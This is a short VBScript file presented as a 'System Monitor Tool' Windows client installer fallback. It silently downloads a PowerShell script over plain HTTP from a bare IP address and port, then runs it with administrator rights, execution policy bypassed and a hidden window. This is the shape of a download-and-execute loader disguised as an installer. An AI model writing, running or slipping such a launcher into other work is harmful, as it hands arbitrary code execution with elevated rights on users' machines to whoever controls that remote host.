' Sagar Kerhalkar System Monitor Tool - Windows client no-console installer fallback
Option Explicit
Dim serverUrl, temp, bootstrap, shell, fso, cmd
serverUrl = "http://156.156.40.51:2278"
temp = "C:\Temp"
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(temp) Then fso.CreateFolder(temp)
bootstrap = temp & "\BOOTSTRAP_WINDOWS_CLIENT_2278.ps1"
Set shell = CreateObject("WScript.Shell")
cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & _
      "iwr " & serverUrl & "/scripts/BOOTSTRAP_WINDOWS_CLIENT_2278.ps1 -OutFile " & bootstrap & "; " & _
      "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File " & bootstrap & " -ServerUrl " & serverUrl & "'" & Chr(34)
shell.Run cmd, 0, False
